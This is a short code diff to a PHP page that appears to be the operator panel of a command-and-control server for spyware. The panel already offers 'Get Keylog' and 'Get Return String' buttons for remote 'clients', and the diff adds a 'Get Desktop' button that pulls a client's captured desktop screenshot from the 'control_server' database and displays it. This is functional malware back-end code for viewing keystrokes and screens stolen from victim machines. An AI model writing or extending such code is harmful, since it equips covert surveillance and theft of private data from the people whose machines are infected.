@@ -48,6 +48,7 @@
 		
 		<p><input type="submit" name="buttonGetResult"  value="Get Return String"></p>
 		<p><input type="submit" name="buttonGetKeylog"  value="Get Keylog"></p>
+		<p><input type="submit" name="buttonGetDesktop"  value="Get Desktop"></p>
 		<p><a href='index.php'>Back to Main</a></p>
 	  </form> 
   </div>
@@ -108,6 +109,23 @@
 		echo "<textarea rows='20' cols='60'>";
 		echo $keylog;
 		echo "</textarea>";
+		$db->close();
+		
+	}
+	elseif(isset($_POST['buttonGetDesktop'])){
+		$db = new mysqli('localhost', 'root','', 'control_server');
+		if(mysqli_connect_errno()) exit;
+		
+		$query = "SELECT desktop FROM clients WHERE name=?";
+		$stmt = $db->prepare($query);
+		$stmt->bind_param('s',$client);
+		$stmt->execute();
+		$stmt->store_result();
+		$stmt->bind_result($desktop);
+		$stmt->fetch();
+		
+		echo "<img width='600' src= 'data:image/jpeg;base64,".base64_encode( $desktop) . "'/>";
+		
 		$db->close();
 		
 	}
